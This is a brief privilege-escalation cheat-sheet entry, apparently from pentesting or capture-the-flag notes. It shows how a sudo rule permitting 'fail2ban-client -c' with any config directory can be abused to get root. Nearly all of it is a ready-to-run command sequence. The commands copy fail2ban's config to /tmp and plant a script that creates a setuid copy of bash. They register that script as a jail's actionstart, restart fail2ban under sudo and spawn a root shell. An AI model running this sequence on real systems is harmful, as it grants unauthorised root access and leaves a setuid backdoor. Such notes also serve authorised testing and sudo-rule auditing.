# fail2ban-client Sudo Config-Dir Abuse

If sudo allows `fail2ban-client -c <config-dir>` with an arbitrary directory, fail2ban's `actionstart` directive lets you run arbitrary commands as root when a custom jail "starts".

```bash
rsync -av /etc/fail2ban/ /tmp/fail2ban/
echo '#!/bin/sh
cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > /tmp/script
chmod +x /tmp/script

cat > /tmp/fail2ban/action.d/x.conf <<EOF
[Definition]
actionstart = /tmp/script
EOF
printf '[my-jail]\nenabled = true\naction = x\n' >> /tmp/fail2ban/jail.local
touch /tmp/fail2ban/filter.d/my-jail.conf

sudo fail2ban-client -c /tmp/fail2ban/ -v restart
/tmp/bash -p
```
